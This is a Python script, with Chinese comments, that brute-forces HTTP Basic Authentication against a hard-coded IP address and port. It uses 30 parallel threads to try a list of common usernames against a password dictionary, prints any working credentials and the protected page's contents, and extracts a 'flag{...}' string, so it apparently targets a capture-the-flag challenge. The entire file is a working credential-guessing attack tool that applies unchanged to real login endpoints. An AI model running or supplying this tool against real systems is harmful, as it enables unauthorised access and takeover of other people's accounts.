#!/usr/bin/env python3
"""
HTTP Basic Authentication 暴力破解脚本
目标：http://47.113.178.182:32823/
"""

import requests
from requests.auth import HTTPBasicAuth
import concurrent.futures
from itertools import product
import sys

# 目标URL
target_url = "http://47.113.178.182:32823/"

# 读取密码字典
with open('password (1).txt', 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

# 常见用户名列表（根据realm提示，优先admin）
usernames = [
    'admin',  # realm中提示了admin
    'administrator', 'root', 'user', 'test', 'guest',
    'manager', 'webadmin', 'sysadmin', 'operator', 'master',
    'owner', 'superuser', 'support', 'backup', 'demo',
    'Admin', 'ADMIN', 'admin123', 'admin888',
    # 单字母/数字用户名
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
    'x', 'y', 'z',
    '1', '2', '3', '4', '5',
]

print(f"""
╔══════════════════════════════════════════════════════════╗
║      HTTP Basic Auth 暴力破解工具                        ║
║      目标: {target_url}                  ║
╚══════════════════════════════════════════════════════════╝

[*] 认证类型: HTTP Basic Authentication
[*] 用户名数量: {len(usernames)}
[*] 密码数量: {len(passwords)}
[*] 总组合数: {len(usernames) * len(passwords)}
[*] 开始爆破...
""")

# 成功标志
success_found = False
success_info = None

def try_auth(username, password):
    """尝试HTTP Basic认证"""
    global success_found, success_info

    if success_found:
        return None

    try:
        # 使用HTTP Basic Authentication
        response = requests.get(
            target_url,
            auth=HTTPBasicAuth(username, password),
            timeout=5
        )

        # 检查是否认证成功（状态码200）
        if response.status_code == 200:
            success_found = True
            success_info = {
                'username': username,
                'password': password,
                'response': response.text
            }
            return success_info

        return None

    except Exception as e:
        return None

# 使用线程池进行暴力破解
counter = 0
total = len(usernames) * len(passwords)

with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
    # 创建所有任务
    futures = []
    for username, password in product(usernames, passwords):
        future = executor.submit(try_auth, username, password)
        futures.append((future, username, password))

    # 处理结果
    for future, username, password in futures:
        counter += 1

        if success_found:
            # 取消剩余任务
            executor.shutdown(wait=False, cancel_futures=True)
            break

        result = future.result()

        # 每100次尝试显示一次进度
        if counter % 100 == 0:
            print(f"[*] 进度: {counter}/{total} ({counter*100//total}%)")

        if result:
            print(f"\n{'='*70}")
            print(f"[+] 认证成功!")
            print(f"[+] 用户名: {result['username']}")
            print(f"[+] 密码: {result['password']}")
            print(f"{'='*70}")
            print(f"\n[响应内容]")
            print(result['response'])
            print(f"\n{'='*70}")

            # 提取flag
            if 'flag' in result['response'].lower():
                import re
                flags = re.findall(r'flag[A-Z]*\{[^}]+\}', result['response'], re.IGNORECASE)
                if flags:
                    print(f"\n[FLAG] {flags[0]}")

            break

if not success_found:
    print("\n[!] 爆破完成，未找到正确凭证")
    print("[*] 建议:")
    print("    1. 检查用户名列表是否完整")
    print("    2. 尝试使用其他密码字典")
